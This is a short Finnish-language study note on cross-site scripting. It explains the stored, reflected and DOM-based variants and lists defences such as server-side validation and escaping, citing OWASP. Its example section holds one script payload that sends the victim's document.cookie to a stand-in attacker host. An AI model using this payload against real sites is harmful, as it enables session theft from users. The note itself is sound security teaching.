# XSS

Mikä on
- Voi injektoida JavaScriptiä sivulle
- Koodi ajetaan kun sivu ladataan käyttäjän selaimessa
- Ajetaan clinetilla
- Hyvin yleinen

Kolme päätyyppiä xss-muotoa.

## Persistent/stored XSS

- Tietokannassa
- Aina kun joku avaa sivun, koodia ajetaan
- Lomake, johon voi laittaa tekstiä. Teksti talletetaan kantaan, ja näytetään jossain vaiheessa käyttäjille.

## Refelected XSS

- Vain kun käyttäjä klikkaa spesifia URL:ia


## DOM based XSS

- Ajetaan client side
- Ei ole serverin suojaa (validointia) XSS:ää vastaan


## Esimerkki

Lähetetään käyttäjälle linkki, jossa JavaScriptiä.

```
<script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>
```

Tai syötetään lomakeen kenttään ylläoleva Javascript koodi, jollioin se tallentuu tietokantaan. Stored XSS etuna hyökkääjälle on se, että sillä voi saavuttaa jopa tuhansia käyttäjiä. Refelected XSS:ssä käyttäjä pitää huijata klikkaamaan haitallista linkkiä.

## Suojautuminen

Inputin validointi
- myös serverin päässä

Erkoismerkkien vaihto (escping) / koodaus


### lähteet

Owasp top 10
- https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf
